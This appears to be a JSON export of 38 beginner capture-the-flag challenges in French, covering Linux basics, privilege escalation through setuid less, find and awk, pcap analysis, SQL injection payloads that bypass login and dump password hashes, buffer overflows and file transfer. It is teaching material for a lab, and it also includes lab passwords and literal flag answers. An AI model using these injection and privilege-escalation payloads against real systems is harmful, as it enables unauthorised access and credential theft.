{"count": 38, "results": [
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Intro",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 1,
        "value": 1,
        "description": "\nLes flags sont souvent générés aléatoirement.</br>\nPour valider ce challenge copie/colle le flag: 373c51258167377b8a81168f11aea626"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Intro..",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 2,
        "value": 1,
        "description": "\nDans ce CTF, les flags sont de la forme `flag_{abcedfgh}`.</br>\nPour valider ce challenge copie/colle le flag: flag_{m0n_pr3m13r_fl4g}"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "LolCatz",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 3,
        "value": 5,
        "description": "\nHello, jeune Padawan !</br></br>\nLe chemin pour devenir un Jedi est long. Nous allons faire tes premiers pas ensemble...</br></br>\n<code>\n$ ssh luke@IPSERVER\n</code></br>\nConnecte toi au serveur en IPSERVER, avec le user 'luke' et le mot de passe 'tatooine'.</br></br>\n<code>\n$ pwd\n</code></br>\nDans quel répertoire es tu connecté ?</br></br>\n<pre>\n$ ls\n</pre></br>\nQuel sont les fichiers de ce répertoire ?</br></br>\n<pre>\n$ cat flag1.txt\n</pre></br>\nQue contient le fichier flag1.txt ?</br>\nCopie ce Flag pour valider ce challenge !"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Crouching Tiger, Hidden Dragon",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 4,
        "value": 5,
        "description": "\nParfois les fichiers sont cachés en plein jour.\n```\n$ ssh yoda@IPSERVER\n```\nConnecte toi au serveur en IPSERVER, avec le user 'yoda' et le mot de passe 'naboo'.</br></br>\n```\nls -al\n```\nListe les fichiers cachés, et affiche des infos sur le propriétaire et les groupes."
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Home Sweet Home",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 5,
        "value": 5,
        "description": "\n```\n$ ssh obiwan@IPSERVER\n```\nConnecte toi au serveur en IPSERVER, avec le user 'obiwan' et le mot de passe 'hoth'.</br></br>\nComment ça ton frigo est vide ?</br>\nEt comment est celui de la voisine ?</br>\nJete un oeil chez /home/padme...</br></br>\nLes répertoires des utilisateurs sont le plus souvent dans le répertoire /home. Celui de l'administrateur en /root.</br>\nCe sont les répertoires à examiner en priorité... Ils sont parfois autorisés en lecture."
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Résidence secondaire",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 6,
        "value": 5,
        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'jarjar' et le mot de passe 'shili'.</br></br>\nCertains comptes système comme les serveur web ou de base de donnée n'ont pas de répertoire du tout, ou un répertoire situé dans les données de leur application.</br></br>\nOn les trouve en avant-dernière colonne du fichier /etc/passwd qui est toujours en lecture par tous.</br>\nOu se trouve le home du compte mace ?</br></br>\nLes flags sont le plus souvent aléatoires... ou presque."
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "C'est juste temporaire",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 7,
        "value": 5,
        "description": "\nConnecte toi en ssh à IPSERVER avec le user dooku et le password dagobah.</br></br>\n```bash\nfind / -name flag*.txt\n```\nUtilise la commande find pour rechercher tous les fichiers qui ont un nom du type flagXX.txt</br></br>\nLes utilisateurs et administrateurs laissent souvent des fichiers interessant dans les répertoires temporaires comme /tmp et /var/tmp.</br></br>"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "My sweet Business Executive",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 8,
        "value": 7,
        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'quigong' et le mot de passe 'bespin'.</br></br>\n```\n./welcome_07\n```\nLancer un fichier exécutable dans le répertoire courant avec ./xxxxx.</br></br>\n```\nstrings welcome_07\n```\nDumper les chaînes de caractères contenues dans le binaire. On y trouve généralement les noms de fichiers de config, et parfois des comptes ou de mots de passe en clair."
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Agent Double",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 9,
        "value": 7,
        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'grievous' et le mot de passe 'yavin'.</br></br>\nUtilise les informations qui ont leaké pour te faire passer pour leia avec la commande: su - lea"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Attrape moi si tu peux",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 10,
        "value": 7,
        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'han' et le mot de passe 'ando'.</br></br>\nOutch, ce fichier est vraiment gros... Ca va prendre des heures de le lire...</br>\n```\ngrep flag liste10.txt\n```\nFiltrons le pour n'afficher que les lignes avec le mot 'flag'.</br></br>\nJ'ai plein de temps pour improver mon skillz à Candy Crush(tm) maintenant... C'est qui le plus malin ?"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Y en a un peu plus, j'vous le mets quand même ?",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 11,
        "value": 10,
        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'c3po' et le mot de passe 'corellia'.</br></br>\nLes fichiers zip sont des souvent utilisés pour faire des sauvegardes. On y trouve parfois des fichiers de config avec des infos três intéressantes.</br>\n```\nhead flag11.zip\n```\nAffiche les premières lignes du fichier zip avec head. L'entête commence par PK, c'est bien un zip, on peut lire le nom des fichiers qu'il contient et le flag parait être en clair. </br>\nIntéressant... L'algo ne compresse pas les tout petits fichiers...</br></br>\n```\nunzip flag11.zip\n```\nIl est utile de connaitre les différents outils de compression : zip, unzip, 7zip, rar,... et savoir reconnaitre leurs entêtes caractéristiques.</br>"
    },
    {
        "category": "Ghost in the Shell",
        "state": "visible",
        "requirements": "null",
        "name": "Du goudron et des plumes",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 12,
        "value": 10,
        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'finn' et le mot de passe 'yavin'.</br></br>\nLa commande tar est utilisée pour faire tenir toute une arborescence de fichiers en un seul fichier xxx.tar, qui est généralement compressé avec l'algorithme gzip.</br>\nOn se retrouve avec un fichier xxx.tar.gz, ou xxx.tgz.</br>\nDécompresse le avec la commande tar (options) (fichier)</br>\nSi tu as vraiment la flemme de chercher les options de la commande, tu peux regarder le contenu du fichier avec vi.</br>\nL'éditeur est carrément old school, mais il est utile de le connaître car il est présent presque partout.</br>\nPour en sortir : [Esc] :q!</br></br>\nvim est plus sympathique, mais pas toujours installé. Enjoy !"
    },
    {
        "category": "Privilege Escalation",
        "state": "visible",
        "requirements": "null",
        "name": "Pas moins",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 13,
        "value": 10,
        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'tokio' et le mot de passe 'esther'.</br></br>\n```\nid\n```\nRegarde quel est ton id.</br></br>\nVa dans le répertoire de moscow.</br></br>\nEssaye de lire son flag.</br></br>\n```\nls -al\n./less (fichier que tu as le droit de lire...)\n```\nLe binaire less possède un sticky bit. Less est un utilitaire qui permet de lire un fichier et de se déplacer en avant et en arrière. Tu vas pouvoir lire le fichier comme si tu étais moscow.</br>\nTu peux ouvrir un shell en tapant '!sh'.</br></br>\nSors du less en tapant 'q'.</br>\n```\nid\ncat flag02.txt\n```"
    },
    {
        "category": "Privilege Escalation",
        "state": "visible",
        "requirements": "null",
        "name": "Trouvé !",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 14,
        "value": 10,
        "description": "\nConnecte toi au serveur en 10.0.0.10, avec le user 'moscow' et le mot de passe 'alvaro'.</br></br>\nVa dans le répertoire de rio et essaye de lire son flag.</br></br>\n```\nls -al\n```\nLe binaire find possède un sticky bit. Tu vas pouvoir l'utiliser comme si tu étais rio. </br>\nL'option -exec permet de lancer des commandes shell. Utilise la pour lancer la commande id.</br></br>\n```\n./find . -name flag* -exec cat {} \\;\n```\nLisons le flag.</br></br>"
    },
    {
        "category": "Privilege Escalation",
        "state": "visible",
        "requirements": "null",
        "name": "Une petite histoire du temps",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 15,
        "value": 10,
        "description": "\nConnecte toi au serveur en IPSERVER, avec le user 'rio' et le mot de passe 'paco'.</br></br>\nRegarde quel est ton id.</br></br>\nVa dans le répertoire de berlin.</br></br>\n```\nls -al\n./awk 'BEGIN{system(\\\"id\\\")}'\n```\nLe binaire awk possède un sticky bit. awk est un utilitaire de manipulation de fichier. Tu vas pouvoir l'utiliser comme si tu étais rio. Il permet de lancer des commandes shell. Utilise le pour lancer la commande id.</br></br>\n```\n./awk 'BEGIN{file=\"flag04.txt\";while ((getline<file) > 0) {print}}'\n```\nLisons le flag.</br></br>"
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Netcat - pcap",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 16,
        "value": 10,
        "description": "\nL'outil 'netcat', nc de son petit nom, est LE couteau suisse du CTF.</br>\nIl permet d'ouvrir un port en écoute, de s'y connecter à distance et d'envoyer un flux de données comme des messages textes ou des lignes de commande.</br></br>\nIls passent tels quels sur le réseau.</br>\nOuvre le fichier en attachement avec Wireshark, sélectionne un des paquets de l'échange, fais Click droit - Suivre - Flux TCP."
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Telnet - pcap",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 17,
        "value": 10,
        "description": "\nLe protocole Telnet permet de se connecter très simplement à un serveur distant.</br>\nIl commence par négocier les capacités de l'affichage, et permet ensuite une authentification simple par login/mot de passe.</br></br>\nLe login/mot de passe circule bien sur en clair sur le réseau...</br></br>\nLe flag change un peut de format, ce sera flag_xxxx. Ce sera le login de l'utilisateur.</br></br>\nOn se demande pourquoi on recommande ssh ..."
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Telnet again - pcap",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 18,
        "value": 10,
        "description": "\nTelnet permet d'executer des commande shell à distance.</br></br>\nVisiblement le Chief of Admins a fait un cat de son flag...."
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Ftp - pcap",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 19,
        "value": 10,
        "description": "\nLe protocole ftp permet de se connecter, se déplacer dans une arborescence de répertoires, et télécharger/uploader des fichiers.</br></br>\nUn premier flux entre les ports 21 et 35952 (click droit, suivre..) sert à l'authentification:</br>\nUSER xxx</br>\nPASS yyy</br>\net au téléchargement d'un fichier RETR flag04.txt.</br>\nLe contenu du fichier est transféré sur un autre port négocié dynamiquement.</br>\nEnlevez le filtre wireshark qui s'est mis en place quand vous avez fait click droit-suivre-tcp.</br></br>\nLe protocole des paquets est de type FTP-DATA, c'est trop facile de retrouver un flag dans ces conditions..."
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "SMTP - pcap",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 20,
        "value": 10,
        "description": "\nTous ces protocoles sont de vraies passoires, je vais plutôt envoyer un mail...</br></br>\nHistoriquement, pour envoyer un mail, on se connectait à la main sur un serveur SMTP et on utilisait les commandes:</br>\nHELO xxx</br>\nMAIL FROM: <martine@myfirstctf.org></br>\nRCPT TO: <chief_admin@myfirstctf.org></br>\nDATA</br>\net je tape tout ce que je veux en terminant par un point tout seul.</br>\n.</br>\nMon mail est parti :)"
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Netcat",
        "docker": "ctf-tcpserver",
        "max_attempts": 0,
        "type": "standard",
        "id": 21,
        "value": 20,
        "description": "\nAlice t'attend en TCP sur l'IP IPSERVER et le port 9999</br>\n```\n# nc [IP] [port]\n```"
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Telnet",
        "docker": "ctf-telnet",
        "max_attempts": 0,
        "type": "standard",
        "id": 22,
        "value": 20,
        "description": "\nAussi vieux que l'internet, telnet est à éviter, mais ça fonctionne encore.</br>\nSi, nécessaire installe telnet et connecte toi sur IPSERVER en telnet avec le compte marie et le password poppins."
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "Ftp",
        "docker": "ctf-ftp",
        "max_attempts": 0,
        "type": "standard",
        "id": 23,
        "value": 20,
        "description": "\nFtp, pour file Transfert Protocole.</br>\nInstalle un client ftp sinécessaire.</br>\nConnecte toi sur IPSERVER avec le compte spock et le password enterprise.</br>\nQuelques commandes utiles quand elles passent: ls, cd, get, bye, ...</br>\nPro Tips : Pensez à cherchez la différence entre le mode Active et le mode Passive.</br>\nhttps://slacksite.com/other/ftp.html"
    },
    {
        "category": "Network protocol",
        "state": "visible",
        "requirements": "null",
        "name": "POP3",
        "docker": "ctf-smtp",
        "max_attempts": 0,
        "type": "standard",
        "id": 24,
        "value": 30,
        "description": "\nConnectez vous en netcat au IPSERVER sur le port 110 pour relever le courrier de jean.</br>\nSon mot de passe est bon.</br>\nRenseignez-vous sur le protocole POP3: https://www.shellhacks.com/retrieve-email-pop3-server-command-line/"
    },
    {
        "category": "SQLi",
        "state": "visible",
        "requirements": "null",
        "name": "Une Authent en béton",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 25,
        "value": 10,
        "description": "\n```\nhttp://IPSERVER:8081/login.php\n```\nTente de te commecter avec le compte admin et le mot de passe admin. On ne sait jamais...</br></br>\nComment passer l'authentification quand on ne connait pas le mot de passe ?</br></br>\nPar chance, le site est encore un prototype et le développeur a laissé actif des options pour débugguer.</br>\nTu vois qu'il utilise une base de donnée SQL pour gérer les utilisateurs.</br></br>\nIl utilise la requête :SELECT * FROM users WHERE login='admin' AND passwd=md5('admin')</br></br>\nAjoute une quote ' à la fin du nom de user et regarde le résultat...</br>\nCette quote a corrompu la requête SQL. Good. Nous pouvons la modifier pour la réécrire.</br></br>\nEssaye de te connecter avec comme nom de compte:\n```\nadmin' or 1=1#\n```\nNous générons la requète:\n```\nSELECT * FROM users WHERE login='admin' or 1=1#' AND passwd=md5('admin')\n```\nTous les caractère après le # sont ignorés comme des commentaires.</br>\nLe filtre devient\n```\nlogin='admin' or 1=1\n```\nNous sommes authentifié comme le premier user de la base de donnée."
    },
    {
        "category": "SQLi",
        "state": "visible",
        "requirements": "null",
        "name": "Une balade de santé",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 26,
        "value": 10,
        "description": "\nRegarde l'url de consultation des messages, et le texte de débug en bas.</br>\nLa valeur 673489 est passée en paramètre de la requète SQL.</br></br>\nNous allons faire une Injection SQL utilisant UNION.</br>\nRemplace cette valeur par\n```\n673489 UNION select login from users\n```\nTu vas générer la requète :\n```\nSELECT msg FROM messages WHERE idmsg= 673489 UNION select login from users\n```\nCette requète va ajouter les logins des utilisateurs à la fin de la liste des messages."
    },
    {
        "category": "SQLi",
        "state": "visible",
        "requirements": "null",
        "name": "Dans ton SQL, s'il te plait monsieur",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 27,
        "value": 10,
        "description": "\nContinue sur la même url. Cette fois, en plus de noms des users, on va récupérer le hash de leurs password...</br></br>\nRemplace le paramètre 673489 par :\n```\n673489 UNION select concat(login,\" \",passwd) from users\n```\nTu vas générer la requète :\n```\nSELECT msg FROM messages WHERE idmsg= 673489 UNION select concat(login,\" \",passwd) from users\n```\nQui va concaténer la liste des users et leur hash de leur password à la fin de la liste des messages."
    },
    {
        "category": "Buffer overflows",
        "state": "visible",
        "requirements": "null",
        "name": "Ca dépasse !!",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 28,
        "value": 10,
        "description": "\n```\nssh bender@IPSERVER\nmdp: leelu\n```\nLe programme say_hello vient de remporter le concours de l'IA la plus futée du MIT. Malheureusement ses concepteurs se sont concentrés sur les performances du CPU et un peu négligé la sécurité.</br>\nJette un oeil a son source: buffer_01.c </br>\n```\n$ ./say_hello bob\n```\nRemplace bob par 12345678901234567890.\nCa dépasse des 10 caractères alloués au tableau name.\nEt ça va écraser le tableau intro[10]=\"Hello\";\nSi nous continuons, nous pouvons écraser la variable tst, et forcer un appel à print_flag();"
    },
    {
        "category": "Buffer overflows",
        "state": "visible",
        "requirements": "null",
        "name": "Baisse la tête",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 29,
        "value": 15,
        "description": "\n```\nssh leela@IPSERVER\nmdp: yivo\n```\nLes programmeurs ont sorti une version 2 de leur IA, avec une sécurité renforcée.\nJette un oeil a son source: buffer_02.c </br>\nIl faut forcer la valeur de tst à 'Z' pour déclencher un appel à print_flag();"
    },
    {
        "category": "Buffer overflows",
        "state": "visible",
        "requirements": "null",
        "name": "Sec Check",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 30,
        "value": 20,
        "description": "\n```\nssh philip@IPSERVER\nmdp: elzar\n```\nAlertés par la communauté, et sous la pression des investisseurs qui détestent le bad nuzz, les programmeurs ont sorti une version 3 de leur IA, toujours plus sécure.\nJette un oeil a son source: buffer_03.c </br>\nIl faut forcer la valeur de tst à 'SecCheck' pour déclencher un appel à print_flag();"
    },
    {
        "category": "Decode",
        "state": "visible",
        "requirements": "null",
        "name": "Hexadecimal",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 31,
        "value": 5,
        "description": "\nLes ordinateurs codent leurs informations sur des octets qui peuvent prendre une valeur entre 0 et 255.</br>\nUn octet est composé de 8 bits, chacun valant 0 ou 1, que l'on peut grouper deux fois 4 bits.</br>\n0000 0000 vaut 0</br>\n0000 0001 vaut 1</br>\n0000 0010 vaut 2</br>\n0000 0011 vaut 3</br>\n1111 1111 vaut 255.</br>\nLe système hexadécimal est basé 4 bits et permet de compter jusqu'à 16 : 0,1,2,3,4,5,6,7,8,9,A,B,C,D,E,F</br>\n0 = 0  = 0000</br>\nA = 10 = 1010</br>\nB = 11 = 1011</br>\nF = 15 = 1111</br>\nLa notation hexadécimale, telle 0x1F, est souvent utilisée pour donner la valeur 'brutes' d'un octet.</br>\n0x00 = 0</br>\n0x01 = 1</br>\n0xFF = 255</br>\nLe flag est la valeur de 0x1F."
    },
    {
        "category": "Decode",
        "state": "visible",
        "requirements": "null",
        "name": "Ascii",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 32,
        "value": 5,
        "description": "\nLes ordinateurs codent leurs informations, sur des octets.</br>\nUn octet peut prendre une valeur entre 0 et 255.</br>\nLe code ascii standardise l'utilisation de ces valeurs.</br>\n```\nhttps://fr.wikipedia.org/wiki/American_Standard_Code_for_Information_Interchange#/media/File:ASCII-Table-wide.svg\n```\nCertaines valeurs permettent d'afficher du texte, d'autres de déplacer le curseur à l'écran...</br>\nLe flag est constitué de quatre lettres dont les codes ascii sont : 89 111 108 111</br>"
    },
    {
        "category": "Decode",
        "state": "visible",
        "requirements": "null",
        "name": "Base64",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 33,
        "value": 5,
        "description": "\nUn fichier binaire utilise les 255 valeurs des octets.</br>\nUn fichier texte n'utilise que la sous partie texte du code ascii.\nL'encodage base64 permet de coder un fichier binaire en n'utilisant que cette sous partie texte.\nLe flag est l'encodage en base64 du bloc ABCD(_#hj%:-893d\n```\necho 'tralala' | base64\nhttp://www.utilities-online.info/base64/\n```"
    },
    {
        "category": "Decode",
        "state": "visible",
        "requirements": "null",
        "name": "Base64",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 34,
        "value": 5,
        "description": "\nLe flag est le decodage de ZmxhZ191bl9zNGNyM3RfZDNjMGQzdXI=\nLe = à la fin n'est pas systématique, mais est caractéristique de l'encodage base64.\n```\necho 'dHJhbGFsYQo=' | base64 -d\nhttp://www.utilities-online.info/base64/\n```"
    },
    {
        "category": "Decode",
        "state": "visible",
        "requirements": "null",
        "name": "URL",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 35,
        "value": 5,
        "description": "\nLe flag est l'url décodée:\n```\nwww.myhackervault.org/backdoor.php%3Flogin%3Dadmin%27%20or%201%3D1%23\n```\nPro tips: http://www.utilities-online.info/urlencode/"
    },
    {
        "category": "File Upload",
        "state": "visible",
        "requirements": "null",
        "name": "Copier - Coller",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 36,
        "value": 10,
        "description": "\nAvant tout, télécharge le fichier flag01_enc.bin sur ton Kali.\n```\ncat flag01_enc.bin\n```\nEt oui, c est du binaire illisible.</br></br>\n```\nhttp://IPSERVER:9090/index.htm\n```\nOuvre cette URL dans un autre onglet pour obtenir un serveur. </br>\nPuis connecte toi au serveur en ssh, avec le user 'user1' et le mot de passe 'password'.</br>\nLe programme dechiffre_01 va te déchiffrer le fichier flag01_enc.bin une fois transféré sur le serveur.</br>\n```\ncat flag01_enc.bin | base64\n```\nSur ton kali, encode flag01_enc.bin en base64. L'encodage base64 permet de transférer des fichier binaires en mode texte.</br></br>\n```\necho \\\"RXQgb3VpLCDDp2EgbWFyY2hlCg===\\\"| base64 --decode > flag01_enc\n```\nFais ensuite un copier/coller de la chaine base64 générée qui ressemble à RXQgb3VpLCDDp2EgbWFyY2hlCg== dans ton shell sur le serveur.\nDécode avec base64 --decode, et sauve dans le fichier flag01_enc.</br></br>\n```\ndechiffre_01 flag01_enc flag01.txt\n```\nUtilise dechiffre_01 pour déchiffrer le flag encodé et le sauver dans flag01.txt"
    },
    {
        "category": "File Upload",
        "state": "visible",
        "requirements": "null",
        "name": "Secure copy",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 37,
        "value": 10,
        "description": "\nAvant tout, télécharge le fichier dechiffre_02 sur ton Kali.</br>\n```\nls -al dechiffre_02\n```\nIl fait 8k, c est un peu gros cette fois pour un copier/coller...</br></br>\n```\nhttp://IPSERVER:9090/index.htm\n```\nOuvre cette URL dans un autre onglet pour obtenir un serveur. </br>\nPuis connecte toi au serveur en ssh, avec le user 'user2' et le mot de passe 'password'.</br></br>\n```\nscp -P 2224 dechiffre_02 user2@IPSERVER:dechiffre02\n```\nTu as un accès ssh, utilise le mode de transfert de fichier de ssh.\nQuels sont les droits de ton binaire après le transfert ?"
    },
    {
        "category": "File Upload",
        "state": "visible",
        "requirements": "null",
        "name": "Hep Serveur !",
        "docker": "",
        "max_attempts": 0,
        "type": "standard",
        "id": 38,
        "value": 10,
        "description": "\nAvant tout, télécharge le fichier dechiffre_03 sur ton Kali.</br>\n```\npython -m SimpleHTTPServer 8080\n```\nDans le même répertoire que ce fichier, lance un serveur web avec une ligne de python.</br>\nTon Kali dispose maintenant d un serveur web prêt à transférer les fichiers localisés dans le même répertoire.</br></br>\n```\nifconfig\n```\nRecupère l adresse IP de ton Kali.</br></br>\n```\nhttp://IPSERVER:9090/index.htm\n```\nOuvre cette URL dans un autre onglet pour obtenir un serveur. </br>\nPuis connecte toi au serveur en ssh, avec le user 'user3' et le mot de passe 'password'.</br></br>\n```\nwget http://[IP de ton Kali]:8080/dechiffre_03\n```\nRécupère le fichier en utilisant une requête HTTP."
    }
], "meta": {}}